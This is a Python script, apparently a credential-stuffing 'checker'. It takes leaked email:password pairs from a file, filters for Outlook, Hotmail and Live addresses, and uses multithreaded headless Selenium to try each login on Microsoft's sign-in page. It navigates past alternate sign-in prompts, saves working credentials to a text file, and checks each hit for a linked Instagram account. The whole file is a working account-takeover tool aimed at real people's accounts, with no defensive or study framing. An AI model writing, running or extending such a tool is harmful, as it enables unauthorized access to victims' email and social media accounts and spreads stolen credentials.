import requests, sys, os
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time
import concurrent.futures
import threading
import random
from rich import print as rprint
from rich.panel import Panel
from rich.console import Console
from rich.theme import Theme
from rich.style import Style
from insta_checker import check_insta

# Definindo o tema
tema = Theme({
    
    "default": Style(color="white", bgcolor="black"),
    "counter_fail": Style(color="red", bgcolor="black"),
    "counter_success": Style(color="green", bgcolor="black"),
    "counter_instagram": Style(color="cyan", bgcolor="black"),
    "header": Style(color="blue", bgcolor="black", bold=True),
    "result_panel": Style(color="white", bgcolor="black", ),
})

os.system('cls' if os.name == 'nt' else 'clear')

console = Console(theme=tema)

# Cabeçalho
header = Panel.fit(
    "[bold blue]===================================\n"
    "     Hmmm instagram checker \n"
    "===================================",
    style="default",
    border_style="blue"
)
console.print(header)

linha_inicial = 200
num_threads = 8

# Contadores
Email_Fail = 0
Email_Success = 0
Email_Success_With_Instagram = 0
lock = threading.Lock()

def processar_login(login, senha, attempt):
    global Email_Fail, Email_Success, Email_Success_With_Instagram
    
    chrome_options = Options()
    chrome_options.add_argument("--headless")
    chrome_options.add_argument("--disable-gpu")
    chrome_options.add_argument("--window-size=1920x1080")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")

    browser = webdriver.Chrome(options=chrome_options)
    browser.get('https://login.live.com/')

    try:
        WebDriverWait(browser, 10).until(EC.presence_of_element_located((By.NAME, 'loginfmt')))
        browser.find_element(By.NAME, 'loginfmt').send_keys(login)
        browser.find_element(By.CSS_SELECTOR, 'button[type="submit"]').click()

        try:
            WebDriverWait(browser, 1).until(EC.presence_of_element_located((By.ID, 'i0116Error')))
            with lock:
                Email_Fail += 1
            return
        except:
            pass
        # Verifica se o botão "Use your password instead" está presente e clica nele
        try:
            switch_to_password = WebDriverWait(browser, 1).until(
                EC.presence_of_element_located((By.ID, 'idA_PWD_SwitchToPassword'))
                )
            if switch_to_password:
                switch_to_password.click()
        except:
            pass
        try:
            switch_other_ways = WebDriverWait(browser, 1).until(
                EC.presence_of_element_located((By.ID, 'idA_PWD_SwitchToCredPicker'))
            )
            text = switch_other_ways.text.strip()
            if text in ["Outras maneiras de entrar", "Other ways to sign in"]:
                switch_other_ways.click()
                WebDriverWait(browser, 5).until(EC.presence_of_element_located((By.CSS_SELECTOR, 'div[data-testid="routeAnimation"]')))
                # Varrer as divs dentro de routeAnimation
                route_animation_div = browser.find_element(By.CSS_SELECTOR, 'div[data-testid="routeAnimation"]')
                main_text_divs = route_animation_div.find_elements(By.CSS_SELECTOR, 'div[data-testid="mainText"]')
                
                for div in main_text_divs:
                    if div.text.strip() == "Use my password":
                        div.click()
                        WebDriverWait(browser, 4).until(EC.url_changes('https://login.live.com/'))
                        break
        except Exception as e:
            pass
        
        WebDriverWait(browser, 10).until(EC.presence_of_element_located((By.NAME, 'passwd')))
        browser.find_element(By.NAME, 'passwd').send_keys(senha)
        browser.find_element(By.CSS_SELECTOR, 'button[type="submit"]').click()
        try:
            WebDriverWait(browser, 1).until(EC.presence_of_element_located((By.ID, 'i0118Error')))
            with lock:
                Email_Fail += 1
            return
        except:
            pass
        try:
            WebDriverWait(browser,1).until(EC.presence_of_element_located((By.ID, 'idTD_Error')))
            with lock:
                Email_Fail += 1
            return
        except:
            pass

        WebDriverWait(browser, 10).until(EC.url_changes('https://login.live.com/'))

        is_logged = browser.find_elements(By.CSS_SELECTOR, 'input[data-testid="loginOptionHiddenInput"]')
        if is_logged:
            with lock:
                Email_Success += 1
                with open('email_success.txt', 'a') as file:
                    file.write(f"{login}:{senha}\n")
            res = check_insta(login)
            if res == 'ok':
                with lock:
                    Email_Success_With_Instagram += 1
                    with open('instagram.txt', 'a') as file:
                        file.write(f"{login}:{senha}\n")

    except Exception:
        with lock:
            Email_Fail += 1
    finally:
        browser.quit()
        atualizar_resultados()

def atualizar_resultados():
    b = random.randint(5, 208)
    bo = f'\x1b[38;5;{b}m'
    painel_atualizacao = Panel(f"""
{bo}[ Hmmm ]{bo} 
[counter_fail]Email_Fail: {Email_Fail}[/counter_fail] 
[counter_success]Email_Success: {Email_Success}[/counter_success] 
[counter_instagram]Email_Success_With_Instagram: {Email_Success_With_Instagram}[/counter_instagram]
    """, title="Atualização de Resultados", style="default")
    console.print(painel_atualizacao)

def ler_arquivo_senhas(caminho_arquivo):
    with open(caminho_arquivo, 'r', encoding='utf-8') as file:
        linhas = file.readlines()
        with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
            futures = []
            for i, linha in enumerate(reversed(linhas[linha_inicial - 1:])):
                linha = linha.strip()
                if not linha or ':' not in linha:
                    continue
                login, senha = linha.split(':', 1)
                if any(domain in login for domain in ['outlook', 'hotmail', 'live']) and login.endswith(('.com', '.br')):
                    futures.append(executor.submit(processar_login, login, senha, len(linhas) - i))
            concurrent.futures.wait(futures)

if __name__ == "__main__":
    with console.status("[bold green]Lendo senhas..."):
        ler_arquivo_senhas('passwords.txt')
    
    # Exibição dos resultados finais
    painel_resultados = Panel(f"""
[ Hmmm ] 
Email_Fail : [counter_fail]{Email_Fail}[/counter_fail]
Email_Success : [counter_success]{Email_Success}[/counter_success]
Email_Success_With_Instagram : [counter_instagram]{Email_Success_With_Instagram}[/counter_instagram]
    """, title="Resultados Finais", style="default")
    console.print(painel_resultados)
